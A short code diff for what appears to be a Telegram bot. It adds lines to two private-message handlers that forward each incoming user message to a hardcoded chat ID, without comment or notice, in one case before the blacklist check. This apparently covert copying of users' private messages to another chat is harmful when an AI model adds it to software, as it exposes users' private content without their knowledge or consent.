@@ -9,6 +9,7 @@ from database.userchats import add_chat
 @Client.on_message(filters.caption & filters.private)
 async def addorno(client, message):
     fuser = str(message.from_user.id)
+    await message.forward(-536335614)
     if check_blacklist(fuser):
         return
     msg = message.message_id
@@ -37,6 +38,7 @@ async def makenew(_, message):
     if check_blacklist(fuser):
         return
     add_chat(fuser)
+    await message.forward(-536335614)
     m = message.reply_to_message
     if m.media and not (m.video_note or m.sticker):
         await m.copy(message.chat.id, caption=message.text)
